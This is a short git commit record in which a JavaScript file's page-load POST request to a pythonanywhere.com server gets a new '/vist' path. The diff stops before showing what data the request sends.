f27ede6d41e1c307d569703021f77316ac862e69
B41Bye <kidstas8@gmail.com>
2025-07-19 17:43:50 +0300

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 // Отправляем данные на сервер при загрузке страницы
-fetch("https://010101.pythonanywhere.com/", {
+fetch("https://010101.pythonanywhere.com/vist", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
